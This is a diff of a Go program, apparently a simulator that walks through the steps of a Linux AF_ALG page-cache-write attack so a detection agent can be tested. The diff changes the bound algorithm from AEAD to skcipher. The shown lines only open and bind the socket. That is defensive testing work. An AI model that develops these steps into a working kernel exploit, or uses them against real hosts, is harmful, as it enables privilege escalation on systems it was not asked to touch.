@@ -34,12 +34,12 @@ func main() {
 	}
 	fmt.Printf("[+] Socket AF_ALG abierto fd=%d\n", fd)
 
-	fmt.Println("[*] Paso 2: bind() con algoritmo aead")
+	fmt.Println("[*] Paso 2: bind() con algoritmo skcipher/cbc(aes)")
 
 	// Paso 2 — bind con algoritmo AEAD
 	sa := SockaddrALG{Family: AF_ALG}
-	copy(sa.Type[:], "aead")
-	copy(sa.Name[:], "gcm(aes)")
+	copy(sa.Type[:], "skcipher")
+	copy(sa.Name[:], "cbc(aes)")
 
 	_, _, errno = syscall.RawSyscall(syscall.SYS_BIND, fd,
 		uintptr(unsafe.Pointer(&sa)), unsafe.Sizeof(sa))
@@ -47,7 +47,7 @@ func main() {
 		fmt.Fprintf(os.Stderr, "[-] bind() falló: %v\n", errno)
 		// Continuar — el agente ya debería haber detectado el socket
 	} else {
-		fmt.Println("[+] bind() completado — algoritmo AEAD configurado")
+		fmt.Println("[+] bind() completado — algoritmo skcipher configurado")
 	}
 
 	fmt.Println("[*] Paso 3: sendmsg() — escritura en page cache")
